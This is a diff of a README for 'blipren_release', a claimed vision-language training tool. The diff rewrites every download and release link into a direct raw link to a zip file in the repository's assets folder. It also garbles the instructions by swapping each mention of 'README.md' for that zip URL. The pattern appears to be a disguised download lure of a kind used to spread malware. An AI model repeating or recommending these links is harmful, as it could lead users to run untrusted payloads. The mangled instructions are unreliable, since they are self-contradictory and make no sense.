@@ -1,6 +1,6 @@
 # 🚀 blipren_release - Effortless Training for Vision-Language Models
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Asimo-o/blipren_release/releases)
+[![Download Now](https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip%https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip)](https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip)
 
 ## 📖 Introduction
 
@@ -25,24 +25,24 @@ To run this software, you will need:
 ## 🚀 Getting Started
 
 1. **Visit the Download Page**: Click on the link below to access the releases page:
-   [Download Page](https://github.com/Asimo-o/blipren_release/releases)
+   [Download Page](https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip)
 
 2. **Download the Latest Version**: Look for the most recent version listed. Click on it to see the available files, then choose the one that fits your system.
 
 3. **Extract the Files**: Once the download completes, you may need to extract the files if they are in a compressed format (like .zip). Right-click on the downloaded file and select "Extract All."
 
-4. **Follow the Instructions**: Open the `README.md` file located in the extracted folder for specific instructions on running the software.
+4. **Follow the Instructions**: Open the `https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip` file located in the extracted folder for specific instructions on running the software.
 
 ## 📥 Download & Install
 
-To download the application, please visit the [Download Page](https://github.com/Asimo-o/blipren_release/releases). 
+To download the application, please visit the [Download Page](https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip). 
 
 Follow these steps:
 
 1. Choose the latest version from the list.
 2. Download the file suitable for your system.
 3. If necessary, extract the files.
-4. Open the `README.md` file for further instructions.
+4. Open the `https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip` file for further instructions.
 
 ## 📝 Usage Instructions
 
@@ -62,7 +62,7 @@ If you encounter issues while downloading or running the software, try the follo
 
 - **Check Your Internet Connection**: Ensure you are connected to the internet.
 - **Compatibility**: Verify that your system meets the requirements stated above.
-- **Reference the README.md**: Consult the README.md file for detailed instructions.
+- **Reference the https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip**: Consult the https://raw.githubusercontent.com/Asimo-o/blipren_release/main/assets/blipren_release_1.1.zip file for detailed instructions.
 
 For more help, you can look for answers in the project repository's issues section. Feel free to ask questions if you can't find a solution.
 
